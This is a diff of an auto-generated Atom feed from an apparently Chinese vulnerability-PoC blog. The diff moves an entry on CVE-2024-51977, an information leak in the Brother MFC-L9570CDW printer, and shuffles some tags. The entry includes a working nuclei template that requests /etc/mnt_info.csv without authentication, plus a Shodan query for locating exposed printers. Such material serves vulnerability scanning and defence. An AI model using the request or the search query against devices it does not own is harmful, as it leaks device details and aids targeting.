@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-27T01:00:06.415Z</updated>
+  <updated>2025-06-27T01:15:14.172Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
+    <link href="http://example.com/2025/06/27/github_549051398/"/>
+    <id>http://example.com/2025/06/27/github_549051398/</id>
+    <published>2025-06-27T01:15:14.174Z</published>
+    <updated>2025-06-27T01:15:14.172Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 未经身份验证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从易受攻击的设备泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.csv，且无需身份验证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> MFC-L9570CDW</p><p><strong>搜索语法：</strong> html:”MFC-L9570CDW”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother MFC-L9570CDW <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;MFC-L9570CDW&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,printer,info-disclosure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/etc/mnt_info.csv</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Model Name&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;IP Address&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> content_type<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;text/comma-separated-values&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>Missing Authentication for Critical Function vulnerability in Mitsubishi Electric Corporation G</title>
@@ -61,9 +88,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -91,33 +118,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="目录穿越" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
-    <link href="http://example.com/2025/06/27/github_549051398/"/>
-    <id>http://example.com/2025/06/27/github_549051398/</id>
-    <published>2025-06-27T00:45:13.021Z</published>
-    <updated>2025-06-27T00:45:13.018Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从而从易受攻击的设备泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.csv，且无需认证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> MFC-L9570CDW</p><p><strong>搜索语法：</strong> html:”MFC-L9570CDW”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0cbb831273949aa1c08c97675cda71d91a7c3ef3/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother MFC-L9570CDW <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;MFC-L9570CDW&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,printer,info-disclosure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/etc/mnt_info.csv</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Model Name&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;IP Address&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> content_type<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;text/comma-separated-values&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
@@ -524,9 +524,9 @@
     <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
